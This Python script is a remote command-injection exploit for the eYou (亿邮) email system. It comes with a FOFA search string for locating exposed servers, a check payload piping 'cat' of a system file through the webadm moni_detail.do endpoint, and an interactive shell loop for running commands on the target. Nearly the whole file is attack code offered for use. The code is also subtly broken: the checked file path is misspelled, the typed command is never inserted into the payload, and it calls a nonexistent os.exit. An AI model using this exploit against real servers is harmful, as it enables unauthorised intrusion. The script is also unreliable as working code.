#!/usr/bin/python3
#fofa search: app="亿邮电子邮件系统"
#Author Drunkmars


import sys
import requests
import os
import re
from urllib3.exceptions import InsecureRequestWarning

def Check():
	try:
		CheckData = "'|cat /etc/password||'"
		response = requests.post(url = payload,data = CheckData,headers = headers,verify = False,timeout = 10)

		if(response.status_code == 200 and 'root:' in response.text):
			print("[+] Target can vulnable!")
			return True
		else:
			print("[-] Target can not vulnable!")
			return False

	except Exception as e:
		print("[-] Server error!")

def Exploit():
	try:
		command = input("# ")
		if(command == 'exit'):
			sys.exit()
		if(command == 'cls'):
			os.exit()
		
		ExpData = "'|" + "||'"
		response = requests.post(url = payload,data = ExpData,headers = headers,verify = False,timeout = 10)
		#print(response.text)

		#使用正则表达式去除html标签
		result = re.match(r'<html>(.|\n)*</html>', response.text)
		CmdShow = response.text.replace(result[0],"")
		print(CmdShow)
	except Exception as e:
		print("[-] Server not support this command!")

if __name__ == '__main__':
	if(len(sys.argv) < 2):
		print("UseAge: python3 exploit.py target")
		print("Example: python3 exploit.py https://192.168.1.1/")
		sys.exit()

	requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

	headers = {
			"User-Agent" : "Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
			"Content-Type" : "application/x-www-form-urlencoded"
	}

	target = sys.argv[1]
	
	payload = target + "webadm/?q=moni_detail.do&action=gragh"
	
	while Check() is True:
		Exploit()